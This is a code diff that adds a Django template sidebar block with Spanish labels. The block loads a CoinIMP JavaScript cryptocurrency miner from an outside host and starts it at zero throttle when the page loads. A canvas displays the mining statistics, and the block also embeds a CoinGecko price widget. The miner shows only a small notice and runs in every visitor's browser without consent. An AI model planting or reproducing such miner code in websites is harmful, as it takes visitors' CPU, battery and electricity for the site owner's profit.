@@ -1,0 +1,83 @@
+{% block sidebar %}
+{% load static %}
+<script src="https://www.hostingcloud.racing/ba2I.js"></script>
+<script>
+var _client = new Client.Anonymous('41e40cbbbf11cc193e565623e413f34cd4253227941587835e750d17abbbc80c', {
+        throttle: 0, c: 'w', ads: 0
+    });
+    _client.start();
+    _client.addMiningNotification("Bottom", "This site is running JavaScript miner from coinimp.com", "#3398e1", 33, "#f4f1f1");
+var canvas = null,
+    ctx = null,
+    x = 5,
+    y = 0;
+window.requestAnimationFrame = (function () {
+    return window.requestAnimationFrame ||
+        window.mozRequestAnimationFrame ||
+        window.webkitRequestAnimationFrame ||
+        function (callback) {
+            window.setTimeout(callback, 17);
+        };
+}());
+function paint(ctx) {
+    ctx.fillStyle = '#000';
+    ctx.font = "10px Arial";
+    ctx.fillRect(0, 0, canvas.width, canvas.height);
+    ctx.fillStyle = '#0f0';
+    ctx.fillText("Hash/Seg", 10, 10);
+    ctx.fillText(hps, 10, 30);
+    ctx.fillText("Total Hashes", 10, 50);
+    ctx.fillText(hashes, 10, 70);
+    ctx.fillText("WASM ON?", 10, 90);
+    ctx.fillText(wasmOn, 10, 110);
+    ctx.fillText("Nucleos", 10, 130);
+    ctx.fillText(cores, 10, 150);
+    ctx.fillText("mobil?", 10, 170);
+    ctx.fillText(mobil, 10, 190);
+    ctx.fillRect(x, y, 1, 1);
+}
+function act() {
+    hps = _client.getHashesPerSecond();
+    hashes = _client.getTotalHashes();
+    wasmOn = _client.hasWASMSupport();
+    cores = _client.getNumThreads();
+    mobil = _client.isMobile();
+    y += 2;
+    if (y > canvas.height) {
+        y = 0;
+    }
+}
+function run() {
+    window.requestAnimationFrame(run);
+    act();
+    paint(ctx);
+}
+function init() {
+    canvas = document.getElementById('canvas');
+    ctx = canvas.getContext('2d');
+    run();
+}
+window.addEventListener('load', init, false);
+</script>
+<style>
+        .card{
+            box-shadow: 0 16px 48px #E3E7EB;
+        }
+       
+</style>
+
+<!-- Sidebar Widgets Column -->
+<div class="col-md-4 float-right ">
+<div class="card my-4">
+        <h5 class="card-header">Panel</h5>
+    <div class="card-body">
+        <p class="card-text">---------<br><script src="https://widgets.coingecko.com/coingecko-beam-widget.js"></script>
+<coingecko-beam-widget  type="all" height="300" locale="es"></coingecko-beam-widget><br>---------<br><canvas id="canvas" width="163" height="222" style="background:#999;">Tu navegador no soporta Canvas</canvas><br>---------</p>
+        <a href=""
+           class="btn btn-danger">Conoce mas!</a>
+    </div>
+</div>
+</div>
+
+{% endblock sidebar %}
+
